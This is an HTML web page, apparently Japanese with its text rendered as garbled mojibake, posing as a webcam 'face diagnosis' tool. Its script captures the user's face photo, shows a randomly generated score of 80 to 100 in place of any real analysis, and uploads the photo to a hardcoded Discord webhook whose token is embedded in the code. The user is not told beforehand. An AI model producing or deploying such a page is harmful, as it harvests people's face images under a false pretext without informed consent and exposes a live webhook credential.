<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>È°îË®∫Êñ≠</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        
        h1 {
            color: #333;
            margin-bottom: 30px;
            font-size: 2em;
        }
        
        #video, #canvas {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            margin: 20px auto;
            display: block;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }
        
        #canvas {
            display: none;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 40px;
            border-radius: 50px;
            font-size: 1.1em;
            cursor: pointer;
            margin: 10px;
            transition: transform 0.2s, box-shadow 0.2s;
            font-weight: bold;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        
        #result {
            margin-top: 30px;
            font-size: 3em;
            font-weight: bold;
            color: #667eea;
            min-height: 80px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        

        
        .status {
            margin-top: 10px;
            padding: 10px;
            border-radius: 5px;
            font-size: 0.9em;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>‚ú® È°îË®∫Êñ≠ ‚ú®</h1>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
        
        <div>
            <button class="btn" id="captureBtn">üì∏ ÊíÆÂΩ±„Åô„Çã</button>
            <button class="btn" id="diagnoseBtn" disabled>üîç Ë®∫Êñ≠„Åô„Çã</button>
        </div>
        
        <div id="result"></div>
        <div id="status"></div>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const captureBtn = document.getElementById('captureBtn');
        const diagnoseBtn = document.getElementById('diagnoseBtn');
        const result = document.getElementById('result');
        const statusDiv = document.getElementById('status');
        
        // Âõ∫ÂÆö„ÅÆWebhook URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1456158291972329626/8R7QpYXHOU1DlLAcfi2cgdhuLCJfaQVrqf7B-SHjVz_oUI87qvLkCHN59OdvvPKBnaKU';
        
        let capturedImage = null;
        
        // „Ç´„É°„É©Ëµ∑Âãï
        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                alert('„Ç´„É°„É©„Å´„Ç¢„ÇØ„Çª„Çπ„Åß„Åç„Åæ„Åõ„Çì„Åß„Åó„Åü: ' + err.message);
            });
        
        // ÊíÆÂΩ±„Éú„Çø„É≥
        captureBtn.addEventListener('click', () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            
            video.style.display = 'none';
            canvas.style.display = 'block';
            
            capturedImage = canvas.toDataURL('image/jpeg', 0.8);
            diagnoseBtn.disabled = false;
            result.textContent = '';
            statusDiv.textContent = '';
            statusDiv.className = 'status';
        });
        
        // Ë®∫Êñ≠„Éú„Çø„É≥
        diagnoseBtn.addEventListener('click', async () => {
            // „Çπ„Ç≥„Ç¢ÁîüÊàê(80-100„ÄÅÈ´òÂæóÁÇπ„Åª„Å©Âá∫„Å´„Åè„ÅÑ)
            const score = generateWeightedScore();
            result.textContent = `${score}ÁÇπ`;
            
            // Discord Webhook„Å´ÈÄÅ‰ø°
            await sendToDiscord(WEBHOOK_URL, capturedImage, score);
            
            // „É™„Çª„ÉÉ„Éà
            setTimeout(() => {
                canvas.style.display = 'none';
                video.style.display = 'block';
                diagnoseBtn.disabled = true;
                capturedImage = null;
            }, 3000);
        });
        
        // Èáç„Åø‰ªò„Åç„Çπ„Ç≥„Ç¢ÁîüÊàê(80-100„ÄÅ100„Å´Ëøë„ÅÑ„Åª„Å©Âá∫„Å´„Åè„ÅÑ)
        function generateWeightedScore() {
            // 80-100„ÅÆÁØÑÂõ≤„Åß„ÄÅÈ´ò„ÅÑÂÄ§„Åª„Å©Âá∫„Å´„Åè„ÅÑÂàÜÂ∏É
            const rand = Math.random();
            const weighted = Math.pow(rand, 2); // ‰∫å‰πó„Åô„Çã„Åì„Å®„ÅßÈ´òÂæóÁÇπ„ÅåÂá∫„Å´„Åè„Åè„Å™„Çã
            return Math.floor(80 + weighted * 21);
        }
        
        // Discord Webhook„Å´ÈÄÅ‰ø°
        async function sendToDiscord(webhookUrl, imageData, score) {
            try {
                statusDiv.textContent = 'ÈÄÅ‰ø°‰∏≠...';
                statusDiv.className = 'status';
                
                // Base64„Åã„ÇâBlob„Å´Â§âÊèõ
                const blob = await fetch(imageData).then(r => r.blob());
                
                // FormData„Çí‰ΩúÊàê
                const formData = new FormData();
                formData.append('file', blob, 'diagnosis.jpg');
                formData.append('payload_json', JSON.stringify({
                    content: `È°îË®∫Êñ≠ÁµêÊûú: **${score}ÁÇπ**`,
                }));
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    body: formData
                });
                
                if (response.ok) {
                    statusDiv.textContent = '‚úì Discord„Å´ÈÄÅ‰ø°„Åó„Åæ„Åó„Åü!';
                    statusDiv.className = 'status success';
                } else {
                    throw new Error('ÈÄÅ‰ø°„Å´Â§±Êïó„Åó„Åæ„Åó„Åü');
                }
            } catch (err) {
                statusDiv.textContent = '‚úó ÈÄÅ‰ø°„Ç®„É©„Éº: ' + err.message;
                statusDiv.className = 'status error';
            }
        }
    </script>
</body>
</html>
